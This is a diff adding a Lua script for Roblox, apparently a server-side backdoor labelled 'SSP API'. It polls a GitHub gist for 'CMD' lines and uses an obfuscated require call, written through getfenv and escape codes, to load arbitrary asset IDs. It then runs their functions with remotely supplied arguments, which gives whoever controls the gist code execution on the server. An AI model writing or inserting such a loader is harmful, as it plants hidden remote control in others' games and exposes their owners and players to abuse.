@@ -1,0 +1,74 @@
+local H = game:GetService("HttpService")
+
+local GIST_ID = "94fb9e1c8b34b13c3f0baeb5583c5d76"
+local URL = "https://api.github.com/gists/" .. GIST_ID
+local _R = getfenv()["\114\101\113\117\105\114\101"] -- require
+local lastPayload = ""
+
+print("--- SSP API Original Online ---")
+
+while true do
+    task.wait(2)
+    
+    local success, response = pcall(function()
+        return H:GetAsync(URL .. "?nocache=" .. tick())
+    end)
+
+    if success then
+        local ok, d = pcall(function() return H:JSONDecode(response) end)
+        
+        if ok and d.files and d.files["api.txt"] then
+            local content = d.files["api.txt"].content
+            
+            if content ~= lastPayload and content ~= "" then
+                lastPayload = content
+                local p = string.split(content, "|")
+                
+                if p[1] == "CMD" then
+                    task.spawn(function()
+                        local id = tonumber(p[2])
+                        local sim = p[3]     -- ":" o "." o "()"
+                        local met = p[4]     -- Nombre de la función
+                        local target = p[5]  -- Argumento
+
+                        -- Limpieza de argumento vacío
+                        local finalArg = (target == "VACÍO" or target == "") and nil or target
+
+                        local m_ok, module = pcall(function() return _R(id) end)
+                        
+                        if not m_ok then
+                            warn("Error loading ID: " .. tostring(id))
+                            return
+                        end
+
+                        -- Búsqueda de la función en el módulo
+                        local func = nil
+                        if sim ~= "()" then
+                            for k, v in pairs(module) do
+                                if tostring(k):lower() == tostring(met):lower() then
+                                    func = v
+                                    break
+                                end
+                            end
+                        end
+
+                        -- EJECUCIÓN
+                        pcall(function()
+                            if sim == ":" and func then
+                                func(module, finalArg) -- Llamada require(id):metodo()
+                            elseif sim == "." and func then
+                                func(finalArg)         -- Llamada require(id).metodo()
+                            elseif sim == "()" then
+                                if type(module) == "function" then
+                                    module(finalArg)   -- Llamada require(id)()
+                                else
+                                    module(finalArg)   -- Intento de ejecución de tabla
+                                end
+                            end
+                        end)
+                    end)
+                end
+            end
+        end
+    end
+end
